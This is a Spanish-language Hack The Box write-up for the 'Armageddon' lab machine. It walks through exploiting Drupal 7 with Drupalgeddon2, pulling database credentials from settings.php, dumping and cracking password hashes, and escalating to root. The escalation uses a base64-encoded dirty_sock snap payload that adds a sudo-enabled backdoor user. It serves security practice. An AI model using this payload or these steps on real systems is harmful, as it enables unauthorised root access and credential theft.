---
title: "HTB - Armagedon"
author: "Oscar Bravo"
header: 
  teaser: "/assets/images/post/2021/armagedon.png"
categories:
  - WriteUp
tags:
  - HTB
  - Maquina
---


OS | LINUX
Desarrollado por | bertolis
Dificultad | Fácil
Liberación | 27 Marzo 2021
Puntos | 20

## Enumeración

Al usar nmap utilizando nmap -sCV -A 10.10.10.233 solo encontramos que está abierto el 80
(web)

```
# Nmap 7.91 scan initiated Sun May 16 20:18:43 2021 as: nmap -p 22,80 -sSC -oN Nmap.txt
10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.23s latency).
PORT STATE SERVICE
22/tcp open ssh
| ssh-hostkey:
|  2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|  256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open http
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Armageddon | Armageddon
# Nmap done at Sun May 16 20:18:52 2021 -- 1 IP address (1 host up) scanned in 9.00 seconds
```

Empezamos a hacer reconocimiento de la web con whatsweb y nos damos cuenta que es un
drupal, y con ayuda de robots.txt podemos ver el CHANGELOG.txt nos damos cuenta que es un drupal
v. 7.58.

Con searchxploit nos damos cuenta que hay un exploit en Metasploit llamado
**exploit/unix/webapp/drupal_drupalgeddon2** que nos permite obtener la 1° shell

![]()

## 1° Shell

Revisamos la carpeta sites y de ahí se busca los datos de la conexión a la base de datos que se
encuentra en /var/www/html/sites/default/settings.php y vemos que son usuario drupaluser y
password CQHEy@9M*m23gBVj, el problema es que tenemos una shell muy básica por lo que nos
obliga a usar el siguiente script para enumerar la BD.

```
· mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
· mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'
· mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
```

Para así obtener los datos de *brucetherealadmin* y obtener el hash de su clave. Con la
ayuda de john the ripper y utilizando el diccionario rockyou obtenemos la clave booboo.

```
[brucetherealadmin@armageddon ~]$ john pass --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
No password hashes left to crack (see FAQ)

[brucetherealadmin@armageddon ~]$ john pass —show
?:booboo

1 password hash cracked, 0 left
```

## Shell Usuario

Con la clave obtenida podemos ingresar mediante ssh. Una vez adentro podemos leer la flag de
usuario.

Lo primero que debemos ver es si tenemos algun permiso de sudoer con sudo -l, y nos damos
cuenta que tenemos permiso para /usr/bin/snap install *, por lo que buscamos si tenemos alguna
forma de escalar privilegios.

Investigando vemos que podemos crear nuestra propia aplicación snap usando el proyecto
disrty_socket, lo que generará un usuario con escalada de privilegios locales.

```
[brucetherealadmin@armageddon ~]$ python -c "print
('aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAA
AAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1
daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3
Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc2
9jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHkt
c29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOi
AnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFt
ZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP
8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET
/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8
BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZ
ecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAA
AAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'+ 'A' * 4256
+ '==')" | base64 -d > racso.snap
sudo snap install racso.snap —devmode
```

## Root Shell

Con el usuario dirty_socket creado (dirty_sock:dirty_sock) utilizamos sudo su para acceder
como root y obtener la flag.

```
[brucetherealadmin@armageddon ~]$ su dirty_sock
Contraseña:
[dirty_sock@armageddon brucetherealadmin]$ sudo su
[root@armageddon brucetherealadmin]#
````

![Racso](https://www.hackthebox.com/badge/image/159593)